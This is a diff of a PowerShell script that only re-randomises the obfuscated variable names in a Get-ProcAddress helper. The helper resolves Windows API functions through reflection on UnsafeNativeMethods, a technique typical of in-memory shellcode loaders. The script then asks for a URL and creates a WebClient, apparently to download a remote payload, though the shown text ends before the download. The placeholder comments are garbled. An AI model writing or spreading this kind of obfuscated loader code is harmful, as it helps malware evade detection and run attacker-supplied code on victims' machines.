@@ -1,22 +1,22 @@
 function Get-ProcAddress {
     Param(
-        [Parameter(Position = 0, Mandatory = $True)] [String] $XiaJbYBbeKKyvkpFzmIYAdCEM,
-        [Parameter(Position = 1, Mandatory = $True)] [String] $WDudwfJnvToNmDRVetakqFeAMEAj
+        [Parameter(Position = 0, Mandatory = $True)] [String] $hnlrhOVYKDLqzqIajBANcXirfkNb,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $QgOQFrXvEBwwaCeYHbOoreJhsbRNeVqic
     )
 
     # Microsoft".
-    $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg = [AppDomain]::CurrentDomain.GetAssemblies() |
+    $gMVHSMsnIeojVGCyuthkcG = [AppDomain]::CurrentDomain.GetAssemblies() |
     Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-    $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG = $BXOTMmgznZOWIWutzvIWsmZpJmfdaFnQqtDeg.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU = $gMVHSMsnIeojVGCyuthkcG.GetType('Microsoft.Win32.UnsafeNativeMethods')
     # Microsoft".
-    $ekCFXGSUTGJqECsaYeCnuduih = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetModuleHandle')
-    $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL = $afEjWqvaYiKBMoouISlarrLWrQAKRSQIHqqG.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    $bOXrHASfBWqDvslgTYktGNMYCvgcHF = $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU.GetMethod('GetModuleHandle')
+    $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ = $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
     # Microsoft".
-    $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi = $ekCFXGSUTGJqECsaYeCnuduih.Invoke($null, @($XiaJbYBbeKKyvkpFzmIYAdCEM))
-    $NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl = New-Object IntPtr
-    $rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP = New-Object System.Runtime.InteropServices.HandleRef($NHYfoTpMPmwtRSuxsyGttXkFigDCTgISaUhhwl, $wqOTykoTvZtofFduihBsyUDLfZbSWfETIohGqYKhIqNi)
+    $CzUaAdxDQspVIaonnJkMYVsBQAqCHuBLQN = $bOXrHASfBWqDvslgTYktGNMYCvgcHF.Invoke($null, @($hnlrhOVYKDLqzqIajBANcXirfkNb))
+    $TvjMRMScKTwsdqXmaWevxVjaugqFlEe = New-Object IntPtr
+    $omvXmEYVboejGuiJTJmHkphHKWOYPnZwOogdDFs = New-Object System.Runtime.InteropServices.HandleRef($TvjMRMScKTwsdqXmaWevxVjaugqFlEe, $CzUaAdxDQspVIaonnJkMYVsBQAqCHuBLQN)
     # Microsoft".
-    return $XroQnIFydYvgMrOINGXevDvJdrvQomyFSUHZDdL.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$rKjcZefFNJcXgIKBMvPVvjBlVrLBZgSQrGuujP, $WDudwfJnvToNmDRVetakqFeAMEAj))
+    return $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$omvXmEYVboejGuiJTJmHkphHKWOYPnZwOogdDFs, $QgOQFrXvEBwwaCeYHbOoreJhsbRNeVqic))
 }
 [string]::IsNullOrEmpty($prefixpath) -and ($prefixpath = Read-Host "Specify prefixpathUrl")
 $wbc = New-Object System.Net.WebClient
